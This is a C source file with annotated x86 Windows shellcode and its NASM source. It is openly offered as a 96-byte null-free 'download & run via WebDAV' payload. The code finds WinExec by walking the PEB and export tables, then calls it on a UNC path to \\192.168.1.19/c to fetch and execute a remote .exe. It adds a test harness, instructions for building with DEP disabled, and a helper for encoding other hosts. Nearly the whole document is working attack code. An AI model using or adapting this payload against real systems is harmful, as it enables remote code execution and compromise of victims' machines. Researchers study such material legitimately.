/*
* Author:           Sean Dillon
* Copyright:        (c) 2016 RiskSense, Inc. (https://risksense.com)
* Release Date:     March 1, 2016
*
* Description:      x86 Windows null-free download & run via WebDAV shellcode
* Assembled Size:   96 bytes
* Tested On:        Windows XP, Windows 10
* License:          http://opensource.org/licenses/MIT
*
* Build/Run:        MSVC with /NXCOMPAT:NO in Propertes->Linker->Advanced->DEP
*/

/*
* NOTE: This C code connects to WebDAV at \\192.168.1.19:80/c to download and execute an .exe.
* The WinExec() API downloads and runs dirty files from UNC paths with the "WebClient" daemon.
* The end of this file contains the .nasm source code and instructions for building from that.
*/

#include <stdio.h>
#include <string.h>

char shellcode[] =
    "\x6a\x30"                      /* push   $0x30 */
    "\x5e"                          /* pop    %esi */
    "\x64\xad"                      /* lods   %fs:(%esi),%eax */
    "\x8b\x40\x0c"                  /* mov    0xc(%eax),%eax */
    "\x8b\x70\x0c"                  /* mov    0xc(%eax),%esi */
    "\xad"                          /* lods   %ds:(%esi),%eax */
    "\x8b\x10"                      /* mov    (%eax),%edx */
    "\x8b\x5a\x18"                  /* mov    0x18(%edx),%ebx */
    "\x89\xd9"                      /* mov    %ebx,%ecx */
    "\x03\x49\x3c"                  /* add    0x3c(%ecx),%ecx */
    "\x8b\x49\x78"                  /* mov    0x78(%ecx),%ecx */
    "\x01\xd9"                      /* add    %ebx,%ecx */
    "\x8b\x41\x20"                  /* mov    0x20(%ecx),%eax */
    "\x01\xd8"                      /* add    %ebx,%eax */
    "\x31\xd2"                      /* xor    %edx,%edx */
    "\x52"                          /* push   %edx */
    "\x5f"                          /* pop    %edi */
    "\x8b\x34\x90"                  /* mov    (%eax,%edx,4),%esi */
    "\x01\xde"                      /* add    %ebx,%esi */
    "\x42"                          /* inc    %edx */
    "\x81\x3e\x57\x69\x6e\x45"      /* cmpl   $0x456e6957,(%esi) */
    "\x75\xf2"                      /* jne    24 <find_winexec> */
    "\x8b\x71\x24"                  /* mov    0x24(%ecx),%esi */
    "\x01\xde"                      /* add    %ebx,%esi */
    "\x66\x8b\x14\x56"              /* mov    (%esi,%edx,2),%dx */
    "\x8b\x71\x1c"                  /* mov    0x1c(%ecx),%esi */
    "\x01\xde"                      /* add    %ebx,%esi */
    "\x8b\x74\x96\xfc"              /* mov    -0x4(%esi,%edx,4),%esi */
    "\x01\xde"                      /* add    %ebx,%esi */
    "\x57"                          /* push   %edi */
    "\x68\x31\x39\x2f\x63"          /* push   $0x632f3931 */
    "\x68\x38\x2e\x31\x2e"          /* push   $0x2e312e38 */
    "\x68\x32\x2e\x31\x36"          /* push   $0x36312e32 */
    "\x68\x5c\x5c\x31\x39"          /* push   $0x39315c5c */
    "\x54"                          /* push   %esp */
    "\xff\xd6"                      /* call   *%esi */
    "\xeb\xfe";                     /* jmp    5e <spin> */

int main()
{
    printf("Shellcode length: %d\n", (int)strlen(shellcode));

    (*(void(*)(void))&shellcode)();

    return 0;
}

/* --------------------------------------------------------------------------------------
* Author:           Sean Dillon
* Copyright:        (c) 2016 RiskSense, Inc. (https://risksense.com)
* Release Date:     March 1, 2016
*
* Description:      x86 Windows null-free download & run via WebDAV shellcode
* Assembled Size:   96 bytes
* Tested On:        Windows XP, Windows 10
* License:          http://opensource.org/licenses/MIT
;
; Build/Run:        nasm -o webdav.o webdav.nasm
;                   ld -o webdav webdav.o
;                   objdump -d webdav

BITS 32
global _start
section .text

push 0x30                       ; PEB offset
pop esi
db 0x64                         ; dword ptr fs : []
lodsd                           ; eax = NtCurrentTeb()->ProcessEnvironmentBlock
mov eax, [eax + 0x0c]           ; eax = PEB->Ldr
mov esi, [eax + 0x0c]           ; eax = PEB->Ldr.InLoadOrder
lodsd
mov edx, [eax]
mov ebx, [edx + 0x18]           ; ebx = GetModuleHandle(L"kernel32.dll")

mov ecx, ebx                    ; ecx = (IMAGE_DOS_HEADERS *)ebx
add ecx, [ecx + 0x3c]           ; ecx = ecx->e_lfanew
mov ecx, [ecx + 0x78]           ; ecx = ecx->OptionalHeader.DataDirectory[0].VirtualAddress
add ecx, ebx                    ; ecx = IMAGE_EXPORT_DIRECTORY

mov eax, [ecx + 0x20]           ; eax = ecx->AddressOfNames
add eax, ebx

xor edx, edx                    ; edx = 0
push edx
pop edi                         ; edi = 0

find_winexec:
mov esi, [eax + edx * 4]        ; esi = ExportNamePointerTable[edx]
add esi, ebx
inc edx                         ; ++edx

cmp dword [esi], 0x456e6957     ; if (memcmp(esi, "WinE", 4) != 0)
jne find_winexec                ;   goto find_winexec

mov esi, [ecx + 0x24]           ; esi = ecx->AddressOfNameOrdinals
add esi, ebx

mov dx, [esi + edx * 2]         ; dx = ExportOrdinalTable[edx]
mov esi, [ecx + 0x1c]           ; esi = ecx->AddressOfFunctions
add esi, ebx                    ;

mov esi, [esi + edx * 4 - 4]    ; esi = &WinExec()
add esi, ebx

push edi                        ; '\0'
push 0x632f3931
push 0x2e312e38
push 0x36312e32
push 0x39315c5c
push esp                        ; ss = \\192.168.1.19/c

; Python2 one-liner to generate host string stack pushes
; "0x"+"\n0x".join(map(''.join, zip(*[iter('\\\\192.168.1.19/c'[::-1].encode('hex'))]*8)))

call esi

spin:                           ; loop forever, downloaded process has taken over
jmp spin                        ; second stage can clean up

;--------------------------------------------------------------------------------------*/